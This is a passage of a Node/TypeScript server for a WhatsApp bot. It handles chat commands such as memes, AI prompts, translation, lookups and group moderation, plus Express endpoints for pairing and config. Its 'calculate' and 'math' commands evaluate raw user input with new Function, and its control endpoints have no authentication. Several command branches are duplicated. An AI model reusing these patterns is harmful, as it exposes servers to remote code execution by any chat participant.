                await sock.sendMessage(msg.key.remoteJid, { text: jokes[Math.floor(Math.random() * jokes.length)] });
            } else if (cmd === 'meme') {
                try {
                    const res = await axios.get('https://meme-api.com/gimme');
                    await sock.sendMessage(msg.key.remoteJid, { image: { url: res.data.url }, caption: res.data.title });
                } catch (e) {
                    await sock.sendMessage(msg.key.remoteJid, { text: '❌ Failed to fetch a meme.' });
                }
            } else if (cmd === 'ytmp3' || cmd === 'ytmp4') {
                await sock.sendMessage(msg.key.remoteJid, { text: `❌ Please use ${config.prefix}play instead.` }, { quoted: msg });
            } else if (cmd === 'ai' || cmd === 'gpt' || cmd === 'gemini') {
                if (args.length === 0) return await sock.sendMessage(msg.key.remoteJid, { text: `❌ Please provide a prompt. Example: ${config.prefix}ai What is the capital of France?` });
                const prompt = args.join(' ');
                await sock.sendMessage(msg.key.remoteJid, { text: `🧠 Thinking...` });
                
                const taskId = Math.random().toString(36).substring(7);
                aiTasks.push({
                    id: taskId,
                    prompt: prompt,
                    remoteJid: msg.key.remoteJid,
                    status: 'pending'
                });
            } else if (cmd === 'calc') {
                const expression = args.join(' ');
                try {
                    const result = eval(expression.replace(/[^0-9+\-*/().]/g, ''));
                    await sock.sendMessage(msg.key.remoteJid, { text: `🧮 *Résultat:* ${result}` }, { quoted: msg });
                } catch {
                    await sock.sendMessage(msg.key.remoteJid, { text: `❌ Expression invalide.` }, { quoted: msg });
                }
            } else if (cmd === 'tr' || cmd === 'translate') {
                if (args.length < 2) return await sock.sendMessage(msg.key.remoteJid, { text: `❌ Usage: ${config.prefix}tr <langue> <texte>` }, { quoted: msg });
                const lang = args[0];
                const textToTranslate = args.slice(1).join(' ');
                try {
                    const response = await ai.models.generateContent({
                        model: 'gemini-3.1-flash-preview',
                        contents: `Translate the following text to ${lang}. Only return the translation, nothing else: "${textToTranslate}"`
                    });
                    await sock.sendMessage(msg.key.remoteJid, { text: `🌐 *Traduction (${lang}):*\n\n${response.text}` }, { quoted: msg });
                } catch (e) {
                    await sock.sendMessage(msg.key.remoteJid, { text: `❌ Échec de la traduction.` }, { quoted: msg });
                }
            } else if (cmd === 'wiki' || cmd === 'wikipedia') {
                if (args.length === 0) return await sock.sendMessage(msg.key.remoteJid, { text: `❌ Usage: ${config.prefix}wiki <recherche>` }, { quoted: msg });
                const query = args.join(' ');
                try {
                    const response = await ai.models.generateContent({
                        model: 'gemini-3.1-flash-preview',
                        contents: `Fais un résumé court et précis (style Wikipedia) sur : ${query}`
                    });
                    await sock.sendMessage(msg.key.remoteJid, { text: `📚 *Wikipedia:*\n\n${response.text}` }, { quoted: msg });
                } catch (e) {
                    await sock.sendMessage(msg.key.remoteJid, { text: `❌ Échec de la recherche.` }, { quoted: msg });
                }
            } else if (cmd === 'lyrics') {
                if (args.length === 0) return await sock.sendMessage(msg.key.remoteJid, { text: `❌ Usage: ${config.prefix}lyrics <chanson>` }, { quoted: msg });
                const query = args.join(' ');
                try {
                    const response = await ai.models.generateContent({
                        model: 'gemini-3.1-flash-preview',
                        contents: `Donne-moi les paroles de la chanson "${query}". Si tu ne trouves pas, dis-le.`
                    });
                    await sock.sendMessage(msg.key.remoteJid, { text: `🎤 *Paroles:*\n\n${response.text}` }, { quoted: msg });
                } catch (e) {
                    await sock.sendMessage(msg.key.remoteJid, { text: `❌ Échec de la recherche.` }, { quoted: msg });
                }
            } else if (cmd === 'github') {
                if (args.length === 0) return await sock.sendMessage(msg.key.remoteJid, { text: `❌ Usage: ${config.prefix}github <username>` }, { quoted: msg });
                try {
                    const res = await axios.get(`https://api.github.com/users/${args[0]}`);
                    const data = res.data;
                    const text = `🐙 *GitHub Info*\n\n👤 *Nom:* ${data.name || data.login}\n📝 *Bio:* ${data.bio || 'Aucune'}\n👥 *Abonnés:* ${data.followers}\n📦 *Dépôts publics:* ${data.public_repos}\n🔗 *Lien:* ${data.html_url}`;
                    await sock.sendMessage(msg.key.remoteJid, { image: { url: data.avatar_url }, caption: text }, { quoted: msg });
                } catch (e) {
                    await sock.sendMessage(msg.key.remoteJid, { text: `❌ Utilisateur introuvable.` }, { quoted: msg });
                }
            } else if (cmd === 'crypto') {
                if (args.length === 0) return await sock.sendMessage(msg.key.remoteJid, { text: `❌ Usage: ${config.prefix}crypto <coin>` }, { quoted: msg });
                try {
                    const res = await axios.get(`https://api.coingecko.com/api/v3/simple/price?ids=${args[0].toLowerCase()}&vs_currencies=usd`);
                    const price = res.data[args[0].toLowerCase()]?.usd;
                    if (price) {
                        await sock.sendMessage(msg.key.remoteJid, { text: `💰 *Prix de ${args[0].toUpperCase()}:* $${price}` }, { quoted: msg });
                    } else {
                        await sock.sendMessage(msg.key.remoteJid, { text: `❌ Crypto introuvable.` }, { quoted: msg });
                    }
                } catch (e) {
                    await sock.sendMessage(msg.key.remoteJid, { text: `❌ Échec de la récupération du prix.` }, { quoted: msg });
                }
            } else if (cmd === 'promote') {
                if (!isGroup) return await sock.sendMessage(msg.key.remoteJid, { text: '❌ Commande réservée aux groupes.' }, { quoted: msg });
                const mentioned = msg.message.extendedTextMessage?.contextInfo?.mentionedJid || [];
                if (mentioned.length > 0) {
                    await sock.groupParticipantsUpdate(msg.key.remoteJid, mentioned, "promote");
                    await sock.sendMessage(msg.key.remoteJid, { text: `✅ Utilisateur(s) promu(s) admin.` }, { quoted: msg });
                } else {
                    await sock.sendMessage(msg.key.remoteJid, { text: `❌ Mentionne quelqu'un à promouvoir.` }, { quoted: msg });
                }
            } else if (cmd === 'demote') {
                if (!isGroup) return await sock.sendMessage(msg.key.remoteJid, { text: '❌ Commande réservée aux groupes.' }, { quoted: msg });
                const mentioned = msg.message.extendedTextMessage?.contextInfo?.mentionedJid || [];
                if (mentioned.length > 0) {
                    await sock.groupParticipantsUpdate(msg.key.remoteJid, mentioned, "demote");
                    await sock.sendMessage(msg.key.remoteJid, { text: `✅ Utilisateur(s) rétrogradé(s).` }, { quoted: msg });
                } else {
                    await sock.sendMessage(msg.key.remoteJid, { text: `❌ Mentionne quelqu'un à rétrograder.` }, { quoted: msg });
                }
            } else if (cmd === 'kick') {
                if (!isGroup) return await sock.sendMessage(msg.key.remoteJid, { text: '❌ Commande réservée aux groupes.' }, { quoted: msg });
                const mentioned = msg.message.extendedTextMessage?.contextInfo?.mentionedJid || [];
                if (mentioned.length > 0) {
                    await sock.groupParticipantsUpdate(msg.key.remoteJid, mentioned, "remove");
                    await sock.sendMessage(msg.key.remoteJid, { text: `✅ Utilisateur(s) expulsé(s).` }, { quoted: msg });
                } else {
                    await sock.sendMessage(msg.key.remoteJid, { text: `❌ Mentionne quelqu'un à expulser.` }, { quoted: msg });
                }
            } else if (cmd === 'add') {
                if (!isGroup) return await sock.sendMessage(msg.key.remoteJid, { text: '❌ Commande réservée aux groupes.' }, { quoted: msg });
                if (args.length === 0) return await sock.sendMessage(msg.key.remoteJid, { text: `❌ Usage: ${config.prefix}add <number>` }, { quoted: msg });
                const target = args[0].replace(/[^0-9]/g, '') + '@s.whatsapp.net';
                try {
                    await sock.groupParticipantsUpdate(msg.key.remoteJid, [target], "add");
                    await sock.sendMessage(msg.key.remoteJid, { text: `✅ Utilisateur ajouté.` }, { quoted: msg });
                } catch (e) {
                    await sock.sendMessage(msg.key.remoteJid, { text: `❌ Échec de l'ajout.` }, { quoted: msg });
                }
            } else if (cmd === 'setname') {
                if (!isGroup) return await sock.sendMessage(msg.key.remoteJid, { text: '❌ Commande réservée aux groupes.' }, { quoted: msg });
                if (args.length === 0) return await sock.sendMessage(msg.key.remoteJid, { text: `❌ Usage: ${config.prefix}setname <nom>` }, { quoted: msg });
                await sock.groupUpdateSubject(msg.key.remoteJid, args.join(' '));
                await sock.sendMessage(msg.key.remoteJid, { text: `✅ Nom du groupe modifié.` }, { quoted: msg });
            } else if (cmd === 'setdesc') {
                if (!isGroup) return await sock.sendMessage(msg.key.remoteJid, { text: '❌ Commande réservée aux groupes.' }, { quoted: msg });
                if (args.length === 0) return await sock.sendMessage(msg.key.remoteJid, { text: `❌ Usage: ${config.prefix}setdesc <description>` }, { quoted: msg });
                await sock.groupUpdateDescription(msg.key.remoteJid, args.join(' '));
                await sock.sendMessage(msg.key.remoteJid, { text: `✅ Description du groupe modifiée.` }, { quoted: msg });
            } else if (cmd === 'link') {
                if (!isGroup) return await sock.sendMessage(msg.key.remoteJid, { text: '❌ Commande réservée aux groupes.' }, { quoted: msg });
                try {
                    const code = await sock.groupInviteCode(msg.key.remoteJid);
                    await sock.sendMessage(msg.key.remoteJid, { text: `🔗 *Lien du groupe:*\nhttps://chat.whatsapp.com/${code}` }, { quoted: msg });
                } catch (e) {
                    await sock.sendMessage(msg.key.remoteJid, { text: `❌ Je dois être admin pour avoir le lien.` }, { quoted: msg });
                }
            } else if (cmd === 'revoke') {
                if (!isGroup) return await sock.sendMessage(msg.key.remoteJid, { text: '❌ Commande réservée aux groupes.' }, { quoted: msg });
                try {
                    await sock.groupRevokeInvite(msg.key.remoteJid);
                    await sock.sendMessage(msg.key.remoteJid, { text: `✅ Lien du groupe réinitialisé.` }, { quoted: msg });
                } catch (e) {
                    await sock.sendMessage(msg.key.remoteJid, { text: `❌ Je dois être admin pour réinitialiser le lien.` }, { quoted: msg });
                }
            } else if (cmd === 'weather') {
                if (args.length === 0) return await sock.sendMessage(msg.key.remoteJid, { text: `❌ Please provide a city name. Example: ${config.prefix}weather Paris` });
                const city = args.join(' ');
                try {
                    const res = await axios.get(`https://wttr.in/${encodeURIComponent(city)}?format=%l:+%C+%t,+%w,+%h+humidity`);
                    await sock.sendMessage(msg.key.remoteJid, { text: `🌤️ *Weather Info:*\n\n${res.data}` });
                } catch (e) {
                    await sock.sendMessage(msg.key.remoteJid, { text: '❌ Failed to fetch weather data. Make sure the city name is correct.' });
                }
            } else if (cmd === 'calc' || cmd === 'calculate' || cmd === 'math') {
                if (args.length === 0) return await sock.sendMessage(msg.key.remoteJid, { text: `❌ Please provide a math expression. Example: ${config.prefix}calc 5 * 10` });
                const expression = args.join(' ');
                try {
                    // Very basic and safe evaluation using Function instead of eval, though still has risks.
                    // A better approach is using a math library, but for simplicity:
                    const result = new Function(`return ${expression}`)();
                    await sock.sendMessage(msg.key.remoteJid, { text: `🧮 *Result:*\n${expression} = *${result}*` });
                } catch (e) {
                    await sock.sendMessage(msg.key.remoteJid, { text: '❌ Invalid math expression.' });
                }
            } else if (cmd === 'github') {
                if (args.length === 0) return await sock.sendMessage(msg.key.remoteJid, { text: `❌ Please provide a GitHub username. Example: ${config.prefix}github octocat` });
                const username = args[0];
                try {
                    const res = await axios.get(`https://api.github.com/users/${username}`);
                    const data = res.data;
                    const caption = `🐙 *GITHUB USER INFO* 🐙\n\n` +
                                    `👤 *Name:* ${data.name || data.login}\n` +
                                    `📝 *Bio:* ${data.bio || 'No bio'}\n` +
                                    `🏢 *Company:* ${data.company || 'None'}\n` +
                                    `📍 *Location:* ${data.location || 'Unknown'}\n` +
                                    `📦 *Public Repos:* ${data.public_repos}\n` +
                                    `👥 *Followers:* ${data.followers}\n` +
                                    `🔗 *Profile:* ${data.html_url}`;
                    await sock.sendMessage(msg.key.remoteJid, { image: { url: data.avatar_url }, caption: caption });
                } catch (e) {
                    await sock.sendMessage(msg.key.remoteJid, { text: '❌ GitHub user not found.' });
                }
            } else if (cmd === 'npm') {
                if (args.length === 0) return await sock.sendMessage(msg.key.remoteJid, { text: `❌ Please provide an NPM package name. Example: ${config.prefix}npm express` });
                const pkg = args[0];
                try {
                    const res = await axios.get(`https://registry.npmjs.org/${pkg}`);
                    const data = res.data;
                    const latestVersion = data['dist-tags'].latest;
                    const latestData = data.versions[latestVersion];
                    const caption = `📦 *NPM PACKAGE INFO* 📦\n\n` +
                                    `🏷️ *Name:* ${data.name}\n` +
                                    `📌 *Version:* ${latestVersion}\n` +
                                    `📝 *Description:* ${data.description || 'No description'}\n` +
                                    `👨‍💻 *Author:* ${latestData.author?.name || 'Unknown'}\n` +
                                    `⚖️ *License:* ${latestData.license || 'Unknown'}\n` +
                                    `🔗 *Link:* https://www.npmjs.com/package/${data.name}`;
                    await sock.sendMessage(msg.key.remoteJid, { text: caption });
                } catch (e) {
                    await sock.sendMessage(msg.key.remoteJid, { text: '❌ NPM package not found.' });
                }
            } else if (cmd === 'translate') {
                if (args.length < 2) return await sock.sendMessage(msg.key.remoteJid, { text: `❌ Please provide a target language code and text. Example: ${config.prefix}translate fr Hello world` });
                const targetLang = args[0];
                const textToTranslate = args.slice(1).join(' ');
                try {
                    const res = await axios.get(`https://api.popcat.xyz/translate?to=${targetLang}&text=${encodeURIComponent(textToTranslate)}`);
                    await sock.sendMessage(msg.key.remoteJid, { text: `🌐 *TRANSLATION*\n\n*Original:* ${textToTranslate}\n*Translated (${targetLang}):* ${res.data.translated}` });
                } catch (e) {
                    await sock.sendMessage(msg.key.remoteJid, { text: '❌ Failed to translate text. Make sure the language code is valid (e.g., fr, es, de).' });
                }
            } else if (cmd === 'waifu') {
                try {
                    const res = await axios.get('https://api.waifu.pics/sfw/waifu');
                    await sock.sendMessage(msg.key.remoteJid, { image: { url: res.data.url }, caption: '🌸 Here is your waifu!' });
                } catch (e) {
                    await sock.sendMessage(msg.key.remoteJid, { text: '❌ Failed to fetch waifu image.' });
                }
            } else if (['neko', 'husbando', 'kitsune', 'hug', 'kiss', 'pat', 'slap', 'cuddle', 'cry', 'smug', 'bonk', 'yeet', 'blush', 'smile'].includes(cmd || '')) {
                try {
                    // Map some commands to valid waifu.pics endpoints if they differ
                    let endpoint = cmd;
                    if (cmd === 'husbando') endpoint = 'waifu'; // fallback as husbando isn't standard sfw
                    if (cmd === 'kitsune') endpoint = 'neko'; // fallback
                    
                    const res = await axios.get(`https://api.waifu.pics/sfw/${endpoint}`);
                    await sock.sendMessage(msg.key.remoteJid, { image: { url: res.data.url }, caption: `✨ ${cmd} ✨` });
                } catch (e) {
                    await sock.sendMessage(msg.key.remoteJid, { text: `❌ Failed to fetch ${cmd} image.` });
                }
            }
        }
    });

    if (phoneNumber && !sock.authState.creds.registered) {
        session.status = 'connecting';
        try {
            // Wait a bit before requesting pairing code
            await new Promise(resolve => setTimeout(resolve, 2000));
            const code = await sock.requestPairingCode(phoneNumber);
            return code;
        } catch (err) {
            console.error('Error requesting pairing code:', err);
            session.status = 'disconnected';
            throw err;
        }
    } else if (sock.authState.creds.registered) {
        session.status = 'connecting';
    }

    return null;
}

// Auto-start existing sessions
const sessionsDir = path.join(process.cwd(), 'sessions');
if (!fs.existsSync(sessionsDir)) {
    fs.mkdirSync(sessionsDir);
}
fs.readdirSync(sessionsDir).forEach(dir => {
    if (fs.statSync(path.join(sessionsDir, dir)).isDirectory()) {
        startBot(dir).catch(console.error);
    }
});

app.post('/api/pair', async (req, res) => {
  const { phoneNumber } = req.body;
  if (!phoneNumber) {
      res.status(400).json({ error: 'Phone number required' });
      return;
  }
  
  try {
    const sessionId = phoneNumber.replace(/[^0-9]/g, '');
    const code = await startBot(sessionId, phoneNumber);
    res.json({ code, sessionId });
  } catch (err: any) {
    res.status(500).json({ error: err.message });
  }
});

app.get('/api/sessions', (req, res) => {
    const sessionList = Array.from(sessions.values()).map(s => ({
        id: s.id,
        status: s.status,
        phoneNumber: s.phoneNumber || s.id
    }));
    res.json(sessionList);
});

app.post('/api/logout', (req, res) => {
    const { sessionId } = req.body;
    const session = sessions.get(sessionId);
    if (session && session.sock) {
        session.sock.logout();
        session.status = 'disconnected';
        sessions.delete(sessionId);
    }
    res.json({ success: true });
});

app.get('/api/config', (req, res) => {
    res.json(getConfig());
});

app.get('/api/ai-tasks', (req, res) => {
    const pendingTasks = aiTasks.filter(t => t.status === 'pending');
    // Mark as processing so they aren't picked up twice
    pendingTasks.forEach(t => t.status = 'processing');
    res.json(pendingTasks);
});

app.post('/api/ai-tasks/:id', async (req, res) => {
    const { id } = req.params;
    const { result, error } = req.body;
    
    const task = aiTasks.find(t => t.id === id);
    if (task) {
        task.status = error ? 'failed' : 'completed';
        // We don't have the specific session here, so we broadcast to all connected sessions
        // In a real app, we'd store the sessionId in the task
        for (const session of sessions.values()) {
            if (session.status === 'connected' && session.sock && task.remoteJid) {
                try {
                    if (error) {
                        await session.sock.sendMessage(task.remoteJid, { text: '❌ An error occurred while generating AI response.' });
                    } else {
                        await session.sock.sendMessage(task.remoteJid, { text: result || 'No response generated.' });
                    }
                } catch (e) {
                    console.error('Failed to send AI response:', e);
                }
            }
        }
        // Remove task after completion
        const index = aiTasks.indexOf(task);
        if (index > -1) aiTasks.splice(index, 1);
    }
    res.json({ success: true });
});

app.post('/api/config', (req, res) => {
    const { prefix, mode } = req.body;
    const config = getConfig();
    if (prefix) config.prefix = prefix;
    if (mode) config.mode = mode;
    saveConfig(config);
    res.json({ success: true, config });
});

async function startServer() {
  if (process.env.NODE_ENV !== "production") {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: "spa",
    });
    app.use(vite.middlewares);
  } else {
    app.use(express.static('dist'));
    app.get('*', (req, res) => {
        res.sendFile(path.join(process.cwd(), 'dist', 'index.html'));
    });
  }

  app.listen(PORT, "0.0.0.0", () => {
    console.log(`Server running on http://localhost:${PORT}`);
  });
}

startServer();
